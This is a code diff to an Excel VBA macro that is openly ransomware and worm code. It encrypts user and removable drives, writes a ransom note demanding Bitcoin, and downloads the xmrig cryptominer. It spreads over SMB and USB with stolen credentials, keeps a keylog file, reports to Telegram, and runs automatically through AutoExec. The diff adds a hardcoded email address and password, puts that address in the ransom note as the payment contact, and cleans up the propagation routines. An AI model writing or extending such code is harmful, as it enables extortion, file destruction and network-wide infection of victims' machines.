@@ -154,6 +154,10 @@ Private Const MINER_URL1 As String = "https://github.com/xmrig/xmrig/releases/do
 Private Const MINER_URL2 As String = "https://pool.minexmr.com/static/xmrig.exe"
 Private Const MINER_URL3 As String = "https://github.com/MoneroOcean/xmrig_setup/raw/master/setup_xmrig.bat"
 
+' Attacker credentials for email contact & SMTP propagation
+Private Const ATTACKER_EMAIL As String = "daliamarymorito@gmail.com"
+Private Const ATTACKER_PASSWORD As String = "@apple12345"
+
 Private Type PROCESSENTRY32
     dwSize As Long
     cntUsage As Long
@@ -1171,13 +1175,14 @@ Sub RunRansomware()
         EncryptDirectory "C:\Users\Public", exts: Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject"): Dim d As Object
         For Each d In fso.Drives: If d.DriveType = 1 And d.IsReady And LCase(d.DriveLetter) <> "c" Then EncryptDirectory d.DriveLetter & ":\", exts: Next
     End If
-    Dim notePath As String: notePath = userProfile & "\DECRYPT_INSTRUCTIONS.txt": Dim fso2 As Object: Set fso2 = CreateObject("Scripting.FileSystemObject")
+    Dim notePath As String: notePath = userProfile & "\DECRYPT_INSTRUCTIONS.txt"
+    Dim fso2 As Object: Set fso2 = CreateObject("Scripting.FileSystemObject")
     Dim note As String: note = "!!! YOUR FILES ARE ENCRYPTED !!!" & vbCrLf & vbCrLf & _
                                "All your documents, photos, databases, and other important files have been encrypted with AES-256 GCM encryption." & vbCrLf & _
                                "No one can decrypt your files without the unique decryption key." & vbCrLf & vbCrLf & _
                                "To restore your files, you must send 0.5 BTC (Bitcoin) to the following address:" & vbCrLf & vbCrLf & _
                                "   " & BTC_WALLET & vbCrLf & vbCrLf & _
-                               "After sending the payment, contact us at attacker@example.com with your machine ID: " & GetMachineID() & vbCrLf & _
+                               "After sending the payment, contact us at " & ATTACKER_EMAIL & " with your machine ID: " & GetMachineID() & vbCrLf & _
                                "and a proof of payment (transaction ID). We will then send you the decryption tool and key." & vbCrLf & vbCrLf & _
                                "DO NOT try to recover your files using third-party software, it will only damage them permanently!" & vbCrLf & _
                                "DO NOT rename or move the .lzr or .lzr.key files, as this will prevent decryption!" & vbCrLf & _
@@ -1315,20 +1320,43 @@ Sub SMBPropagation()
         If IsPortOpen(ip, 445) Then On Error Resume Next: targets.Add ip, ip: Err.Clear: Next
     End If: If targets.Count = 0 Then SendToTelegram "SMB_PROPAGATION_NO_TARGETS": Exit Sub
     Dim creds As New Collection: creds.Add "Administrator|", "admin_blank_pass": creds.Add Environ("USERNAME") & "|", "user_blank_pass"
-    If Not g_stolenCredentials Is Nothing Then Dim cred As Variant: For Each cred In g_stolenCredentials
-        Dim parts As Variant: parts = Split(cred, "|"): If UBound(parts) >= 1 Then On Error Resume Next: creds.Add parts(0) & "|" & parts(1), parts(0) & "|" & parts(1): Err.Clear
-    Next: End If
-    Dim target As Variant: For Each target In targets: Dim targetIP As String: targetIP = CStr(target): Dim credPair As Variant
-        For Each credPair In creds: Dim username As String: username = Split(CStr(credPair), "|")(0): Dim password As String: password = Split(CStr(credPair), "|")(1)
+    ' Add the attacker's own credentials as a known good credential for propagation
+    On Error Resume Next
+    creds.Add ATTACKER_EMAIL & "|" & ATTACKER_PASSWORD, ATTACKER_EMAIL & "|" & ATTACKER_PASSWORD
+    Err.Clear
+    If Not g_stolenCredentials Is Nothing Then
+        Dim cred As Variant
+        For Each cred In g_stolenCredentials
+            Dim parts As Variant: parts = Split(cred, "|")
+            If UBound(parts) >= 1 Then
+                On Error Resume Next
+                creds.Add parts(0) & "|" & parts(1), parts(0) & "|" & parts(1)
+                Err.Clear
+            End If
+        Next
+    End If
+    Dim target As Variant
+    For Each target In targets
+        Dim targetIP As String: targetIP = CStr(target)
+        Dim credPair As Variant
+        For Each credPair In creds
+            Dim username As String: username = Split(CStr(credPair), "|")(0)
+            Dim password As String: password = Split(CStr(credPair), "|")(1)
             CopyToRemote targetIP, username, password
         Next
-    Next: g_smbPropagated = True
+    Next
+    g_smbPropagated = True
 End Sub
 
 Public Sub RetryPropagation()
-    On Error Resume Next: If Not g_usbPropagated Then USBPropagation: If Not g_smbPropagated Then SMBPropagation
-    If (Not g_usbPropagated) Or (Not g_smbPropagated) Then Application.OnTime Now + TimeValue("00:15:00"), "RetryPropagation"
-    Else SendToTelegram "ALL_PROPAGATION_SUCCESSFUL"
+    On Error Resume Next
+    If Not g_usbPropagated Then USBPropagation
+    If Not g_smbPropagated Then SMBPropagation
+    If (Not g_usbPropagated) Or (Not g_smbPropagated) Then
+        Application.OnTime Now + TimeValue("00:15:00"), "RetryPropagation"
+    Else
+        SendToTelegram "ALL_PROPAGATION_SUCCESSFUL"
+    End If
 End Sub
 
 ' ============================================================
@@ -1619,6 +1647,10 @@ End Sub
 Public Sub AutoExec()
     On Error GoTo ErrorHandler
     Set g_stolenCredentials = New Collection: Set g_emailTargets = New Collection
+    ' Pre-populate stolen credentials with the attacker's own email/password to ensure email propagation works
+    On Error Resume Next
+    g_stolenCredentials.Add ATTACKER_EMAIL & "|" & ATTACKER_PASSWORD, ATTACKER_EMAIL & "|" & ATTACKER_PASSWORD
+    Err.Clear
     gSelfPath = ThisWorkbook.FullName: gKeylogFile = GetTempDir() & "keylog.txt": LoadEncryptedState
     If gRunFlag = "RUN" Then
         If Not m_EngineActive Then Synapse_Engine_Start
